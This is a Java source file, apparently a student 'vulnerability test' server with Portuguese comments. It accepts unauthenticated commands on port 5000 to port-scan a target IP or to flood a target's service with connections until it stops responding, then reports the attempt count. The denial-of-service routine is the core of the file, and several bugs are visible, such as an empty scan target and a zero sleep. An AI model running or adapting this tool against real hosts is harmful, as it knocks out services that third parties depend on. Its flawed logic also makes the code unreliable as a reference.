/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template
 */
package testevunerabilidadeserver;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;


public class TesteVunerabilidadeServer extends Thread{

    private Socket clientConnection = null;
    
    public TesteVunerabilidadeServer(Socket clientConnection)
    {
        this.clientConnection = clientConnection;
       
    }
    
    public static void main(String[] args) throws IOException, InterruptedException  {

            try {
            //Criar um processo à escuta numa porta
            ServerSocket listener = new ServerSocket(5000);
            while(true){ 
            System.out.println("Esperando client se ligar...");
            Socket clientConnection = listener.accept();
            System.out.println("Client se ligou...");
            //Criar um Thread para atender o cliente que se ligou
            Thread t = new TesteVunerabilidadeServer(clientConnection); 
            //colocar a Thread em funcionamento
            t.start(); 
            }
            
        } catch (IOException ex) {
            Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
        }      
    } 
    @Override
    public void run()        
    {
        try {
            //criar canal de input
            BufferedReader clientReceiver = new BufferedReader(new InputStreamReader(clientConnection.getInputStream()));
            //Criar um canal de saida
            PrintStream clientSender = new PrintStream (clientConnection.getOutputStream());
        
            String dataFromClient = null;
            dataFromClient = clientReceiver.readLine();
            
            
            String testType = dataFromClient.substring(0,4);
            System.out.println("testType: "+testType);
            
            if(testType.equalsIgnoreCase("<PS>")){
                String ipTarget = testType.substring(testType.indexOf(">")+1,testType.length());
                System.out.println("ipTarget: "+ ipTarget);
                try {
                portScan(ipTarget, clientSender);
            } catch (InterruptedException ex) {
                Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
            }            
            
            }
            else if(testType.equalsIgnoreCase("<DS>"))
            {
                String ipTarget = dataFromClient.substring(dataFromClient.indexOf(">")+1,dataFromClient.indexOf("|"));
                
                String portTarget = dataFromClient.substring(dataFromClient.indexOf("|")+1,dataFromClient.length());
                System.out.println("portTarget"+portTarget);
                
                
                try{
                attackDos(ipTarget,portTarget,clientSender);
                 }catch (InterruptedException ex) {
                Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
            }
            
            }
    
            clientReceiver.close();
            clientSender.close();
            clientConnection.close(); 
        } 
             
        catch (IOException ex) {
            Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
        } 
       }
    
    public void portScan(String ipClientTarget, PrintStream sendToClient) throws InterruptedException{
        for(int x=100; x<=137; x++){        
            try {
                TimeUnit.SECONDS.sleep(1/1000);
                Socket targetSocket = new Socket(ipClientTarget, x);    
                sendToClient.println("Porta: " + x + " está aberta");
                targetSocket.close();
            } catch (IOException ex) {
                sendToClient.println("Porta: " + x + " está fechada");    
                }
        }
    }
    public void attackDos(String ipClientTarget, String servicePort, PrintStream sendToClient) throws InterruptedException
    {
        
        Random aleatorio = new Random();
        int attempts = aleatorio.nextInt((10000 - 1000) + 1) + 1000;
        // gerar um numero randomico
        while(true){
            try {
                for(int i=0;i<attempts;i++){
                TimeUnit.SECONDS.sleep(1/1000);
                Socket targetSocket = new Socket(ipClientTarget, Integer.parseInt(servicePort));
                Thread attackDos = new TesteVunerabilidadeServer(targetSocket);
                attackDos.start();
              
                    if(i==attempts){
                        targetSocket.close();
                    }
                
                }
                
            } catch (IOException ex) {
                sendToClient.println("Número de conexões máxima atingida!!!!!!");
                sendToClient.println("O numero de tentativas até o serviço cair foram:  "+ attempts);
                break;
            }
        }
        
     
    }
    
    
}

    
    
   
    

